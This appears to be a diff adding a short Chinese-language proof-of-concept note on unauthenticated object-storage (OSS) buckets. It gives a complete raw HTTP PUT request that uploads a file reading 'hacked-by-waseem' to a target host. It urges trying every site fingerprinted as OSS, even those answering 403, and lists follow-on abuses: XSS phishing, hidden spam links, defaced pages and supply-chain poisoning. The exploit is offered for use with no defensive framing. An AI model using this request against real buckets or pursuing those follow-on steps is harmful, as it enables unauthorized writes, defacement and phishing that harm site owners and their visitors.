@@ -1,0 +1,25 @@
+oss存储桶未设置身份验证，导致可以通过put请求包上传任意文件：
+出现指纹为oss的网站都可以尝试，有些网站会有403，但也能尝试上传。
+PUT /poc.json HTTP/1.1
+ Host: target.com
+Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: en-US
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+Connection: keep-alive
+Content-Length: 32
+
+{"id": "hacked-by-waseem"}
+
+如果返回200,说明存在任意文件上传，可通过get方式访问上传文件。
+如果目标的对象存储支持 html 解析，那就可以利用任意文件上传进行 
+XSS 钓鱼、挂暗链、挂黑页、供应链投毒等操作。
